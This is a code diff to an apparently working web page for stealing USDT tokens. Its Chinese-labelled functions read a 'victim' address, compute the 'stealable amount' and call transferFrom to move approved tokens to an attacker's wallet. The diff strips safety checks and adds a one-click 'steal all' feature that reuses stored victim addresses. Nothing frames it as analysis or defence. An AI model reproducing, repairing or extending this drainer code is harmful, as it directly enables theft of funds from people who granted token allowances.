@@ -87,30 +87,17 @@ async function getMax() {
   document.getElementById("amount").value = max;
   updateRecent(victim);
   log("🟢 受害者：" + victim);
-  
-  log("💰 Balance: " + balance);
-  log("🪙 Allowance: " + allowance);
-  if (max === "0") {
-    log("❌ 無法盜取：餘額或授權額度為 0");
-  } else {
-    log("✅ 可盜金額：" + max);
-  }
-
+  log("✅ 可盜金額：" + max);
 }
 
 async function steal() {
   await init();
   const victim = document.getElementById("victim").value;
-  
   const amount = document.getElementById("amount").value;
-  if (!victim || victim.toLowerCase() === attacker.toLowerCase()) {
-    log("❌ 錯誤：受害者地址無效或等於攻擊者本身");
-    return;
-  }
-
   try {
     const tx = await contract.methods.transferFrom(victim, attacker, amount).send({ from: account });
     const link = "https://etherscan.io/tx/" + tx.transactionHash;
+    log("✅ 已執行 transferFrom(" + victim + " ➜ " + attacker + ", " + amount + ")");
     log("✅ 已從 " + victim + " 轉出 USDT：" + amount);
     log("🔗 TX Link: " + link);
   } catch (e) {
@@ -119,8 +106,13 @@ async function steal() {
 }
 
 async function stealAll() {
+  const lastVictim = getLastVictim();
+  if (!lastVictim || lastVictim.toLowerCase() === attacker.toLowerCase()) {
+    log("❌ 無法一鍵盜光：無有效受害者地址或與攻擊者相同");
+    return;
+  }
   await getMax();
-  await steal();
+  await steal(lastVictim);
 }
 
 function log(msg) {
@@ -162,3 +154,13 @@ window.addEventListener("load", renderRecentList);
 </script>
 </body>
 </html>
+
+<script>
+
+function getLastVictim() {
+  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
+  if (list.length === 0) return null;
+  return list[0].split(" ")[0];
+}
+
+</script>
